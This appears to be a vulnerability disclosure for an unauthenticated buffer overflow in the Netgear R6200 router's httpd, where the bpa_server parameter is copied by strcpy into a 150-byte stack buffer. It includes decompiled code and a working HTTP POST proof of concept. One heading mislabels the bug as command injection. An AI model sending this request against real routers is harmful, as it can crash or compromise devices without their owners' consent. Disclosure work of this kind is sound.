# Buffer Overflow Vulnerability in `bpa_server`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6200 Router                                         |
| Firmware Version     | V1.0.1.58_1.0.44                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`basicCgiCdlBpa` â†’ `blkGetDetWanResultCgi`) (data flow via `bpa_server`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameter `bpa_server` |

2. Exploitation Path

```c
int __fastcall basicCgiCdlBpa(char *a1, int a2)
{
  ...
  char v7[256]; // [sp+18h] [-100h] BYREF
  websGetVar(a1, "bpa_idletime", v7);
  if ( atoi(v7) < 100 )
  {
    acosNvramConfig_set("bpa_idletime", v7);
    acosNvramConfig_set("wan_proto", &off_4ED680);
    websGetVar(a1, "bpa_server", v7);
    acosNvramConfig_set("bpa_server", v7);
    ...
}
  
int __fastcall blkGetDetWanResultCgi(int a1, int a2)
{
  ...
  char v13[150]; // [sp+30h] [-298h] BYREF
	...
  else if ( stristr(v14, &off_4ED680) )
  {
    dword_5CA200 |= 8u;
    v8 = (const char *)acosNvramConfig_get("bpa_server");
    strcpy(v13, v8);
    ...
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: Within the `httpd` binary, the `basicCgiCdlBpa` function at line 10 calls `websGetVar(a1, "bpa_server", v7)` to receive input. While a 255-byte length limit is enforced, no further validation is applied. The input is then temporarily stored via `acosNvramConfig_set("bpa_server", v7)` at line 11. Subsequently, the `blkGetDetWanResultCgi` function retrieves this value at line 23 using `v8 = (const char *)acosNvramConfig_get("bpa_server")`. Finally, at line 24, the data is copied into the destination buffer `v13` via `strcpy(v13, v8)`, where `v13` has a size of 150 bytes, resulting in a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability


```http
POST /cgi-bin/basicCgiCdlBpa HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: close

bpa_server=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```